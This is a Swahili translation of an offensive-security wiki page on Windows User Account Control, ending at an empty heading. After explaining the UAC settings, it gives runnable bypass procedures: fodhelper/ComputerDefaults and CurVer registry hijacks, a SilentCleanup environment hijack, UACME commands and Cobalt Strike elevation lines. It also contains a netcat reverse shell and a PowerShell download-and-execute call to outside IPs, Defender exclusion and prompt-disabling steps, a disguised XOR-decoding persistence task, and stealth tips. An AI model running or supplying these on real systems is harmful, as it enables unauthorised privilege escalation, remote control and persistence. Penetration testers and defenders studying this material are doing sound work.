# UAC - Udhibiti wa Akaunti ya Mtumiaji

{{#include ../../banners/hacktricks-training.md}}

## UAC

[Udhibiti wa Akaunti ya Mtumiaji (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) ni kipengele kinachowezesha **kidokezo cha idhini kwa shughuli zinazohitaji ruhusa za juu**. Programu zina viwango tofauti vya `integrity`, na programu yenye **kiwango cha juu** inaweza kutekeleza kazi ambazo **zinaweza kuhatarisha mfumo**. UAC inapowashwa, programu na kazi **huendeshwa kila mara chini ya muktadha wa usalama wa akaunti isiyo ya msimamizi**, isipokuwa msimamizi aidhinishe waziwazi programu/kazi hizo kupata ufikiaji wa kiwango cha msimamizi kwenye mfumo ili ziendeshwe. Ni kipengele cha urahisi kinachowalinda wasimamizi dhidi ya mabadiliko yasiyokusudiwa, lakini hakichukuliwi kuwa mpaka wa usalama.<sup>[[2]](#references)</sup>

Kwa maelezo zaidi kuhusu viwango vya integrity:


{{#ref}}
../windows-local-privilege-escalation/integrity-levels.md
{{#endref}}

UAC inapowashwa, mtumiaji msimamizi hupewa tokens 2: token ya mtumiaji wa kawaida ya kutekeleza vitendo vya kawaida katika kiwango cha integrity cha kati, na token nyingine yenye haki za msimamizi.

[Ukurasa huu](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) unaeleza kwa kina jinsi UAC inavyofanya kazi na unajumuisha mchakato wa kuingia, uzoefu wa mtumiaji na usanifu wa UAC.<sup>[[2]](#references)</sup> Wasimamizi wanaweza kutumia sera za usalama kusanidi jinsi UAC inavyofanya kazi kulingana na mahitaji ya shirika lao katika kiwango cha ndani (kwa kutumia secpol.msc), au kuisanidi na kuisambaza kupitia Group Policy Objects (GPO) katika mazingira ya kikoa cha Active Directory. Mipangilio mbalimbali imeelezwa kwa kina [hapa](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings). Kuna mipangilio 10 ya Group Policy inayoweza kuwekwa kwa UAC. Jedwali lifuatalo lina maelezo zaidi:

| Mipangilio ya Group Policy                                                                                                                                                                                                                                                                                                                                                           | Ufunguo wa Registry                | Mipangilio Chaguomsingi                                              |
| ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ | --------------------------- | ------------------------------------------------------------ |
| [Udhibiti wa Akaunti ya Mtumiaji: Hali ya Idhini ya Msimamizi kwa akaunti ya Msimamizi iliyojengewa ndani](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-admin-approval-mode-for-the-built-in-administrator-account)                                                                                                           | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\FilterAdministratorToken`   | `0` (Imezimwa)                                             |
| [Udhibiti wa Akaunti ya Mtumiaji: Tabia ya kidokezo cha kupandisha kiwango cha ruhusa kwa wasimamizi walio katika Hali ya Idhini ya Msimamizi](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-behavior-of-the-elevation-prompt-for-administrators-in-admin-approval-mode)                                                                     | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorAdmin` | `5` (Omba idhini kwa faili zisizo za Windows kwenye eneo-kazi salama) |
| [Udhibiti wa Akaunti ya Mtumiaji: Tabia ya kidokezo cha kupandisha kiwango cha ruhusa kwa watumiaji wa kawaida](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-behavior-of-the-elevation-prompt-for-standard-users)                                                                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorUser`  | `1` (Omba vitambulisho kwenye eneo-kazi salama)         |
| [Udhibiti wa Akaunti ya Mtumiaji: Tambua usakinishaji wa programu na uombe kupandisha kiwango cha ruhusa](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-detect-application-installations-and-prompt-for-elevation)                                                                                                 | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableInstallerDetection`   | `1` (Imewashwa; imezimwa kwa chaguomsingi kwenye Enterprise)           |
| [Udhibiti wa Akaunti ya Mtumiaji: Pandisha kiwango cha ruhusa kwa faili zinazotekelezeka zilizosainiwa na kuthibitishwa pekee](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-only-elevate-executables-that-are-signed-and-validated)                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ValidateAdminCodeSignatures` | `0` (Imezimwa)                                             |
| [Udhibiti wa Akaunti ya Mtumiaji: Pandisha kiwango cha ruhusa kwa programu za UIAccess zilizosakinishwa katika maeneo salama pekee](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-only-elevate-uiaccess-applications-that-are-installed-in-secure-locations)                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableSecureUIAPaths`       | `1` (Imewashwa)                                              |
| [Udhibiti wa Akaunti ya Mtumiaji: Endesha wasimamizi wote katika Hali ya Idhini ya Msimamizi](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-run-all-administrators-in-admin-approval-mode)                                                                                                                            | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableLUA`                  | `1` (Imewashwa)                                              |
| [Udhibiti wa Akaunti ya Mtumiaji: Ruhusu programu za UIAccess kuomba kupandishwa kwa kiwango cha ruhusa bila kutumia eneo-kazi salama](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-allow-uiaccess-applications-to-prompt-for-elevation-without-using-the-secure-desktop)                                   | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableUIADesktopToggle`     | `0` (Imezimwa)                                             |
| [Udhibiti wa Akaunti ya Mtumiaji: Badili hadi eneo-kazi salama unapoomba kupandishwa kwa kiwango cha ruhusa](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-switch-to-the-secure-desktop-when-prompting-for-elevation)                                                                               | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\PromptOnSecureDesktop`      | `1` (Imewashwa)                                              |
| [Udhibiti wa Akaunti ya Mtumiaji: Elekeza upya hitilafu za uandishi wa faili na registry kwenda kwenye maeneo ya kila mtumiaji](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-virtualize-file-and-registry-write-failures-to-per-user-locations)                                                                     | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableVirtualization`       | `1` (Imewashwa)                                              |

### Sera za kusakinisha programu kwenye Windows

**Sera za usalama za ndani** ("secpol.msc" kwenye mifumo mingi) zimesanidiwa kwa chaguomsingi **kuzuia watumiaji wasio wasimamizi kusakinisha programu**. Hii inamaanisha kwamba hata kama mtumiaji asiye msimamizi anaweza kupakua kisakinishi cha programu yako, hataweza kukiendesha bila akaunti ya msimamizi.

### Funguo za Registry za Kulazimisha UAC Kuomba Kupandishwa kwa Kiwango cha Ruhusa

Ukiwa mtumiaji wa kawaida asiye na haki za msimamizi, unaweza kuhakikisha kuwa akaunti ya "kawaida" **inaombwa vitambulisho na UAC** inapojaribu kutekeleza vitendo fulani. Kitendo hiki kinahitaji kurekebisha **funguo fulani za registry**, jambo linalohitaji ruhusa za msimamizi, isipokuwa kuwe na **UAC bypass**, au mshambuliaji awe tayari ameingia kama msimamizi.

Hata kama mtumiaji yuko kwenye kikundi cha **Administrators**, mabadiliko haya humlazimisha **kuingiza tena vitambulisho vya akaunti yake** ili kutekeleza vitendo vya kiutawala.

**Kwa vitendo, hii inafaa tu ikiwa tayari una token iliyopandishwa kiwango cha ruhusa, UAC bypass, au usanidi usio sahihi unaokuruhusu kubadilisha funguo hizi; la sivyo, uandishi wa registry wenyewe utazuiwa.**

Funguo na maingizo ya registry unayopaswa kubadilisha ni haya (pamoja na thamani zake chaguomsingi kwenye mabano):

- `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System`:
  - `ConsentPromptBehaviorUser` = 1 (3)
  - `ConsentPromptBehaviorAdmin` = 1 (5)
  - `PromptOnSecureDesktop` = 1 (1)

Hili pia linaweza kufanywa kwa mikono kupitia zana ya Local Security Policy. Baada ya kubadilishwa, shughuli za kiutawala humwomba mtumiaji aingize tena vitambulisho vyake.

### Dokezo

**User Account Control si mpaka wa usalama.** Kwa hivyo, watumiaji wa kawaida hawawezi kutoka kwenye akaunti zao na kupata haki za msimamizi bila kutumia exploit ya local privilege escalation.

### Mwombe mtumiaji 'ufikiaji kamili wa kompyuta'

```powershell
hostname | Set-Clipboard
Enable-PSRemoting -SkipNetworkProfileCheck -Force

cd C:\Users\hacedorderanas\Desktop
New-PSSession -Name "Case ID: 1527846" -ComputerName hostname
Enter-PSSession -ComputerName hostname
```

### UAC Privileges

- Internet Explorer Protected Mode hutumia ukaguzi wa integrity kuzuia michakato yenye kiwango cha juu cha integrity (kama vivinjari vya wavuti) kufikia data yenye kiwango cha chini cha integrity (kama folda ya temporary Internet files). Hili hufanywa kwa kuendesha kivinjari kwa tokeni yenye kiwango cha chini cha integrity. Kivinjari kinapojaribu kufikia data iliyohifadhiwa katika eneo lenye kiwango cha chini cha integrity, mfumo wa uendeshaji hukagua kiwango cha integrity cha mchakato na kuruhusu ufikiaji ipasavyo. Kipengele hiki husaidia kuzuia mashambulizi ya remote code execution yasifikie data nyeti kwenye mfumo.
- Mtumiaji anapoingia kwenye Windows, mfumo huunda tokeni ya ufikiaji yenye orodha ya ruhusa za mtumiaji. Ruhusa hufafanuliwa kama mchanganyiko wa haki na uwezo wa mtumiaji. Tokeni hiyo pia ina orodha ya credentials za mtumiaji, ambazo hutumika kumthibitisha mtumiaji kwenye kompyuta na rasilimali za mtandao.

### Autoadminlogon

Ili kusanidi Windows iingie kiotomatiki kwa mtumiaji maalum wakati wa kuwasha, weka **`AutoAdminLogon` registry key**. Hii ni muhimu kwa mazingira ya kiosk au kwa madhumuni ya majaribio. Tumia hii kwenye mifumo salama pekee, kwa kuwa huweka nenosiri wazi kwenye registry.

Weka keys zifuatazo ukitumia Registry Editor au `reg add`:

- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon`:
  - `AutoAdminLogon` = 1
  - `DefaultUsername` = username
  - `DefaultPassword` = password

Ili kurejesha tabia ya kawaida ya kuingia, weka `AutoAdminLogon` kuwa 0.

## UAC bypass

> [!TIP]
> Kumbuka kwamba ikiwa una ufikiaji wa picha kwa kompyuta ya mwathiriwa, UAC bypass ni rahisi sana, kwani unaweza kubofya tu "Yes" kidokezo cha UAC kinapoonekana.

UAC bypass inahitajika katika hali ifuatayo: **UAC imewashwa, mchakato wako unaendeshwa katika muktadha wa medium integrity, na mtumiaji wako ni mwanachama wa kundi la administrators**.

Ni muhimu kutaja kwamba ni **vigumu zaidi kufanya UAC bypass ikiwa kiwango cha usalama kiko juu zaidi (Always) kuliko ikiwa kiko katika kiwango kingine chochote (Default).**

### Uchunguzi wa haraka kutoka kwa medium-integrity shell

Kabla ya kujaribu bypass, thibitisha kuwa uko katika hali inayofaa na tambua build ya host ili kulinganisha na mbinu zinazojulikana kufanya kazi:

```powershell
whoami /groups
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v ConsentPromptBehaviorAdmin
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v PromptOnSecureDesktop
powershell -c "Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion' | select ProductName,DisplayVersion,CurrentBuild,UBR"
schtasks /Query /TN "\Microsoft\Windows\DiskCleanup\SilentCleanup"
```

Maelezo ya vitendo:
- Ikiwa `EnableLUA=0`, huhitaji bypass: tokeni yoyote ya admin inaweza kuomba high integrity moja kwa moja.
- `ConsentPromptBehaviorAdmin=2` au `5` ndiyo hali ya kawaida kwa auto-elevate / COM-based bypasses.
- `Always Notify` huongeza ugumu, lakini bado unapaswa kujaribu build husika badala ya kudhani kuwa itashindwa: UACME bado hufuatilia baadhi ya mbinu zinazooana na `AlwaysNotify` kwenye build za kisasa za Windows.<sup>[[3]](#references)</sup>

### UAC imezimwa

Ikiwa UAC tayari imezimwa (`ConsentPromptBehaviorAdmin` ni **`0`**), unaweza **kutekeleza reverse shell yenye haki za admin** (kiwango cha high integrity) kwa kutumia kitu kama:

```bash
#Put your reverse shell instead of "calc.exe"
Start-Process powershell -Verb runAs "calc.exe"
Start-Process powershell -Verb runAs "C:\Windows\Temp\nc.exe -e powershell 10.10.14.7 4444"
```

#### UAC bypass with token duplication

- [https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/](https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/)
- [https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html](https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html)

### Local RPC + reusable debug object

Kiolesura cha AppInfo local RPC `201ef99a-7fa0-444c-9399-19ba84f12a1a` kinaweza kuunda process huku debugging ikiwa imewezeshwa. Processes zilizoundwa kupitia debugging kwenye thread ileile hushiriki debug object ya thread hiyo; tukio la uundaji hubeba process handle yenye ruhusa za ufikiaji kamili, hata wakati matokeo ya RPC yenyewe yanatoa ufikiaji wenye mipaka tu. Hii inafanya utumiaji tena wa debug object kuwa mbinu ya UAC kwa mwanachama wa kundi la Administrators mwenye medium-integrity.<sup>[[11]](#references)[[12]](#references)</sup>

Mfuatano wa hatua unaoweza kutumika ni:<sup>[[11]](#references)[[12]](#references)</sup>

1. Ita mbinu ya local RPC (moja kwa moja au kupitia `NdrAsyncClientCall`) ili kuunda process ya muda isiyoinuliwa, huku debugging ikiwa imewezeshwa.
2. Tumia `NtQueryInformationProcess` kuuliza `ProcessDebugObjectHandle`, tenga debug object hiyo kwa `NtRemoveProcessDebug`, ihifadhi, kisha usitishe process ya muda.
3. Tumia kiolesura kilekile cha RPC kuunda process inayoaminika inayoinuliwa kiotomatiki, kisha unganisha object iliyohifadhiwa na thread inayoita kupitia `DbgUiSetThreadDebugObject`.
4. Ita `WaitForDebugEvent` na uchukue process handle kutoka kwenye `CREATE_PROCESS_DEBUG_EVENT`; itengenezee nakala kwa `NtDuplicateObject` kabla ya kuendelea.
5. Weka handle iliyorudiwa kwa `UpdateProcThreadAttribute(PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, ...)` na uzindue payload kwa muundo wa extended startup-info. Hii hutumia tena muktadha wa process iliyoinuliwa na pia kumpa child uhusiano wa parent unaoonekana kuaminika.

Tafuta mfuatano mfupi wa hatua badala ya kutafuta binary inayoinuliwa kiotomatiki pekee: uundaji wa process kupitia AppInfo local RPC, maswali ya `ProcessDebugObjectHandle`, kutenganisha/kuunganisha tena debugger, tukio la uundaji wa debugging linalotokea mara moja, urudufu wa handle, na child ambaye parent wake aliyerekodiwa haulingani na process iliyotekeleza API za uundaji.<sup>[[12]](#references)</sup>

### **Rahisi Sana** UAC "bypass" (ufikiaji kamili wa mfumo wa faili)

Ikiwa una shell ya mtumiaji aliye ndani ya kundi la Administrators, unaweza **ku-mount** shared ya C$ kupitia SMB (mfumo wa faili) kwenye diski mpya ya ndani na utakuwa na **ufikiaji wa kila kitu ndani ya mfumo wa faili** (hata folda ya nyumbani ya Administrator).

> [!WARNING]
> **Inaonekana mbinu hii haifanyi kazi tena**

```bash
net use Z: \\127.0.0.1\c$
cd C$

#Or you could just access it:
dir \\127.0.0.1\c$\Users\Administrator\Desktop
```

### UAC bypass kwa kutumia cobalt strike

Mbinu za Cobalt Strike zitafanya kazi tu ikiwa UAC haijawekwa katika kiwango chake cha juu zaidi cha usalama.

```bash
# UAC bypass via token duplication
elevate uac-token-duplication [listener_name]
# UAC bypass via service
elevate svc-exe [listener_name]

# Bypass UAC with Token Duplication
runasadmin uac-token-duplication powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
# Bypass UAC with CMSTPLUA COM interface
runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
```

**Empire** na **Metasploit** pia zina modules kadhaa za **kubypass** **UAC**.

### Interfaces za COM zilizoinuliwa (`ICMLuaUtil` / `CMSTPLUA`)

Vipengee vya COM vinavyojiinua vyenyewe bado ni sehemu inayotumika ya UAC kwenye matoleo ya kisasa. UACME bado inafuatilia `ICMLuaUtil` kama inayofanya kazi kwenye matoleo ya sasa ya Windows, na zana za offensive zinaendelea kurekebisha `CMSTPLUA` kwa kuchanganya mchakato wa desktop shirikishi, utekelezaji wa biti 64, na wakati mwingine kujifanya kuwa PEB/mchakato mwingine kabla ya kuita COM Elevation Moniker.<sup>[[3]](#references)</sup>

Vidokezo vya vitendo:
- Pendelea mchakato wa **biti 64** katika **session shirikishi** ya mtumiaji (mara nyingi `explorer.exe` au mchakato wake wa mtoto).
- Ikiwa raw shell itashindwa, jaribu tena kupitia utekelezaji wa BOF / UACME badala ya wrapper rahisi ya `CreateProcess`.
- Tarajia utekelezaji wa child kufanyika katika **mchakato tofauti ulioinuliwa**; BOF nyingi haziinui beacon ya sasa ndani ya mchakato huo huo.

### KRBUACBypass

Nyaraka na tool zinapatikana katika [https://github.com/wh0amitz/KRBUACBypass](https://github.com/wh0amitz/KRBUACBypass)

### Exploits za kubypass UAC

[**UACME**](https://github.com/hfiref0x/UACME) ni mkusanyiko wa mbinu za kubypass UAC. Icompile kwa Visual Studio au MSBuild; build huunda executables kadhaa (kwa mfano, `Source\Akagi\output\x64\Debug\Akagi.exe`), kwa hivyo chagua method inayofaa build ya target.<sup>[[3]](#references)</sup>\
Kuwa mwangalifu: baadhi ya bypass huanzisha programu zinazoonekana au prompts zinazoweza kumtahadharisha mtumiaji.<sup>[[3]](#references)</sup>

UACME ina **toleo la build ambalo kila technique ilianza kufanya kazi**.<sup>[[3]](#references)</sup> Unaweza kutafuta technique inayoathiri matoleo yako:

```powershell
PS C:\> [environment]::OSVersion.Version

Major  Minor  Build  Revision
-----  -----  -----  --------
10     0      14393  0
```

Pia, kwa kutumia ukurasa [huu](https://en.wikipedia.org/wiki/Windows_10_version_history), unaweza kupata toleo la Windows `1607` kutoka kwenye nambari za build.

Mbinu ya vitendo ni **kutathmini build ya host** kwanza, kisha kutumia method inayolingana:

```cmd
python main.py --scan uac
Akagi64.exe 33 C:\Windows\System32\cmd.exe
```

- `WinPwnage` hulinganisha kwa haraka build ya ndani na mbinu zake za UAC zinazojulikana, jambo linalosaidia kuondoa PoC zilizokufa haraka.<sup>[[4]](#references)</sup>
- `UACME` bado ndiyo katalogi bora ya umma ya kulinganisha bypass na build mahususi. Toleo la 3.7.1 liliongeza mbinu 83–85, huku toleo lililotangulia likijaribu tena mbinu zilizopo dhidi ya **Windows 11 25H2**; kagua upya jedwali la mbinu na maelezo ya matoleo badala ya kudhani PoC ya zamani bado inatumika bila mabadiliko.<sup>[[3]](#references)[[9]](#references)</sup>

### Minyororo ya WNF/UIAccess inayoweza kutumika na Always Notify (UACME 3.7.1)

`Always Notify` haiondoi kila UAC bypass. UACME 3.7.1 inatekeleza mbinu tatu mpya za x64 zinazounganisha hali ya mazingira/protokali inayodhibitiwa na mtumiaji na tabia ya scheduled-task iliyoinuliwa au UIAccess, na kuzitambulisha zote kuwa `AlwaysNotify compatible`:<sup>[[3]](#references)[[9]](#references)</sup>

- **83 — UnifiedConsent:** elekeza upya `SystemRoot` ili WNF-triggered `\Microsoft\Windows\ConsentUX\UnifiedConsent\UnifiedConsentSyncTask` ifanye `taskhostw.exe` iliyoinuliwa ipakie `unifiedconsent.dll` kando. UACME inafuatilia mbinu hii kuanzia Windows 10 build 19041.
- **84 — TabTip:** tumia primitive ileile ya environment-variable dhidi ya UIAccess `TabTip.exe`, ambayo hupakia `windows.storage.dll`, `ApplicationTargetedFeatureDatabase.dll`, au `rsaenh.dll` kutegemea build, kisha pivot kutoka kwenye muktadha wa UIAccess wa high-integrity unaotokana na hilo. UACME inafuatilia mbinu hii kuanzia Windows 8.1 / Server 2016.
- **85 — Narrator:** hijack protokali ya `feedback-hub` ya kila mtumiaji, dhibiti Narrator kwa `Alt+CapsLock+F`, kisha uzindue nakala inayoweza kuandikwa ya `osk.exe` inayopakia `OskSupport.dll` kando. Hii inahitaji desktop inayotumika na inafuatiliwa kuanzia Windows 10 1809 / Server 2019.

Baada ya kuunda payload units na Akagi kama ilivyoelekezwa na UACME, tumia nambari ya mbinu inayolingana (amri ya hiari hutumia `cmd.exe` kwa chaguo-msingi):

```cmd
Akagi64.exe 83 C:\Windows\System32\cmd.exe
Akagi64.exe 84 C:\Windows\System32\cmd.exe
Akagi64.exe 85 C:\Windows\System32\cmd.exe
```

Mbinu 84 na 85 hutegemea UIAccess/mwingiliano wa desktop, kwa hiyo usitarajie zifanye kazi bila mabadiliko kutoka Session 0 au shell ya huduma isiyoingiliana. Zote tatu hubadilisha hali ya mazingira/protokali na kuweka DLLs; kagua utekelezaji na uondoe faili hizo baada ya majaribio.<sup>[[3]](#references)[[9]](#references)</sup>

### UAC Bypass – fodhelper.exe (Registry hijack)

Binary inayoaminika `fodhelper.exe` huendeshwa ikiwa imeinuliwa kiotomatiki kwenye Windows za kisasa. Inapozinduliwa, hukagua njia ya registry ya kila mtumiaji iliyo hapa chini bila kuthibitisha kitenzi cha `DelegateExecute`. Kuweka amri hapo huruhusu mchakato wa Medium Integrity (mtumiaji ni mwanachama wa Administrators) kuanzisha mchakato wa High Integrity bila kidokezo cha UAC.

Njia ya registry inayokaguliwa na fodhelper:
```text
HKCU\Software\Classes\ms-settings\Shell\Open\command
```

<details>
<summary>Hatua za PowerShell (weka payload yako, kisha trigger)</summary>

```powershell
# Optional: from a 32-bit shell on 64-bit Windows, spawn a 64-bit PowerShell for stability
C:\\Windows\\sysnative\\WindowsPowerShell\\v1.0\\powershell -nop -w hidden -c "$PSVersionTable.PSEdition"

# 1) Create the vulnerable key and values
New-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force | Out-Null
New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force | Out-Null

# 2) Set default command to your payload (example: reverse shell or cmd)
# Replace <BASE64_PS> with your base64-encoded PowerShell (or any command)
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -e <BASE64_PS>" -Force

# 3) Trigger auto-elevation
Start-Process -FilePath "C:\\Windows\\System32\\fodhelper.exe"

# 4) (Recommended) Cleanup
Remove-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open" -Recurse -Force
```

</details>
Notes:
- Hufanya kazi wakati mtumiaji wa sasa ni mwanachama wa Administrators na kiwango cha UAC ni chaguomsingi/legevu (si Always Notify yenye vizuizi vya ziada).
- Tumia njia ya `sysnative` kuanzisha PowerShell ya 64-bit kutoka kwenye process ya 32-bit kwenye Windows ya 64-bit.
- Payload inaweza kuwa command yoyote (PowerShell, cmd, au njia ya EXE). Epuka UI zinazoleta prompt kwa ajili ya stealth.

#### `ComputerDefaults.exe` trigger kwa handler ileile ya `ms-settings`

`ComputerDefaults.exe` hutumia association ileile ya `ms-settings\Shell\Open\command` ya kila mtumiaji kama `fodhelper.exe`.<sup>[[13]](#references)[[14]](#references)</sup> Baada ya kuweka command chaguomsingi na thamani tupu ya `DelegateExecute` iliyo hapo juu, tumia `Start-Process "$env:WINDIR\System32\ComputerDefaults.exe"` kama trigger mbadala; usirudie usanidi wa registry.<sup>[[13]](#references)[[14]](#references)</sup> Masharti ya admin mwenye medium-integrity na sera ya UAC yaliyo kwenye maelezo ya `fodhelper.exe` hapo juu bado yanatumika.<sup>[[2]](#references)[[3]](#references)</sup> UACME inaorodhesha trigger hii kuanzia Windows 10 RS4 (build 17134), kwa hiyo ithibitishe kwenye build lengwa.<sup>[[3]](#references)</sup>

#### CurVer/extension hijack variant (HKCU pekee)

Sampuli za hivi karibuni zinazotumia vibaya `fodhelper.exe` huepuka `DelegateExecute` na badala yake **huelekeza upya ProgID ya `ms-settings`** kupitia thamani ya `CurVer` ya kila mtumiaji. Binary inayopandisha ruhusa kiotomatiki bado hutafuta handler chini ya `HKCU`, kwa hiyo tokeni ya admin haihitajiki kuweka keys:<sup>[[5]](#references)</sup>

```powershell
# Point ms-settings to a custom extension (.thm) and map that extension to our payload
New-Item -Path "HKCU:\Software\Classes\.thm\Shell\Open" -Force | Out-Null
New-ItemProperty -Path "HKCU:\Software\Classes\.thm\Shell\Open\command" -Name "(default)" -Value "C:\\ProgramData\\rKXujm.exe" -Force | Out-Null
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings" -Name "CurVer" -Value ".thm" -Force

Start-Process "C:\\Windows\\System32\\fodhelper.exe"   # auto-elevates and runs rKXujm.exe
```

Mara tu inapopata ruhusa zilizopandishwa, malware kwa kawaida **huzima vidokezo vya baadaye** kwa kuweka `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorAdmin` kuwa `0`, kisha hufanya defense evasion zaidi (kwa mfano, `Add-MpPreference -ExclusionPath C:\ProgramData`) na kuunda upya persistence ili iendeshe kwa high integrity. Kazi ya persistence ya kawaida huhifadhi **XOR-encrypted PowerShell script** kwenye diski na kuidecode/kuiendesha kwenye kumbukumbu kila saa:<sup>[[5]](#references)</sup>

```powershell
schtasks /create /sc hourly /tn "OneDrive Startup Task" /rl highest /tr "cmd /c powershell -w hidden $d=[IO.File]::ReadAllBytes('C:\ProgramData\VljE\zVJs.ps1');$k=[Text.Encoding]::UTF8.GetBytes('Q');for($i=0;$i -lt $d.Length;$i++){$d[$i]=$d[$i]-bxor$k[$i%$k.Length]};iex ([Text.Encoding]::UTF8.GetString($d))"
```

Lahaja hii bado husafisha dropper na kuacha staged payloads pekee, hivyo ugunduzi hutegemea ufuatiliaji wa **`CurVer` hijack**, kuchezea `ConsentPromptBehaviorAdmin`, kuunda vighairi vya Defender, au scheduled tasks zinazofanya PowerShell ifungue usimbaji kwa kutumia data iliyo kwenye kumbukumbu.<sup>[[5]](#references)</sup>

### UAC bypass kupitia task ya `SilentCleanup` (`HKCU\Environment\windir`)

`SilentCleanup` huendesha `cleanmgr.exe` kwa mamlaka ya juu zaidi na kupanua `%windir%` kutoka kwenye mazingira ya mtumiaji. Ukidhibiti `HKCU\Environment\windir`, unaweza kuelekeza upanuzi huo kwa amri yoyote na kupata kiwango cha juu cha uadilifu bila kisanduku cha idhini.<sup>[[8]](#references)</sup> Mbinu hii bado inafaa kujaribiwa kwenye build za hivi karibuni kwa sababu UACME bado inaiunga mkono, na ufuatiliaji wa masuala ya hivi karibuni unaonyesha kuwa Windows 11 24H2 huenda ikahitaji marekebisho madogo tu ya uwekaji wa alama za kunukuu.<sup>[[3]](#references)</sup>

```cmd
reg add "HKCU\Environment" /v windir /d "cmd.exe /c start powershell.exe" /f
schtasks /Run /TN "\Microsoft\Windows\DiskCleanup\SilentCleanup"
reg delete "HKCU\Environment" /v windir /f
```

Ikiwa kazi inaweka alama ya kunukuu kwenye path hiyo kwenye build hiyo, jaribu tena kwa payload inayoishia na alama ya kunukuu (kwa mfano `cmd.exe"`). Safisha `HKCU\Environment\windir` kila mara baada ya kujaribu.

#### Udukuzi mwingine wa UAC

Udukuzi mwingi wa kawaida wa UAC unaotumia UI flows, COM objects au mwingiliano na desktop huhitaji **full interactive session** na mtumiaji lengwa; shell ya kawaida ya `nc.exe` au service inayoendesha katika **Session 0** mara nyingi haitoshi.

Mara nyingi unaweza kutatua hili kwa kutumia session ya **meterpreter**. Hamia kwenye **process** yenye thamani ya **Session** iliyo sawa na **1**:

![Elekeza ms-settings kwenye extension maalum (.thm) na uhusishe extension hiyo na payload yetu - Udukuzi mwingine wa UAC: Unaweza kufanya hivi kwa kutumia session ya meterpreter. Hamia kwenye process yenye Session...](<../../images/image (863).png>)

(_explorer.exe_ inapaswa kufanya kazi)

### Udukuzi wa UAC kupitia GUI

Ikiwa unaweza kufikia **GUI, unaweza tu kukubali kidokezo cha UAC** kinapoonekana; huhitaji bypass ya kiufundi. Kwa hiyo, kupata GUI session mara nyingi kunatosha kuondoa kikwazo cha kiutendaji kinachoongezwa na UAC.

Zaidi ya hayo, ukipata GUI session ambayo mtu alikuwa anaitumia (huenda kupitia RDP), **baadhi ya tools zitakuwa zinaendesha kama administrator**, na unaweza **kuendesha** **cmd**, kwa mfano, **kama admin** moja kwa moja bila UAC kukuuliza tena, kama ilivyo kwenye [**https://github.com/oski02/UAC-GUI-Bypass-appverif**](https://github.com/oski02/UAC-GUI-Bypass-appverif). Hii inaweza kuwa **stealthy** zaidi.

### Udukuzi wa UAC wa brute-force wenye kelele nyingi

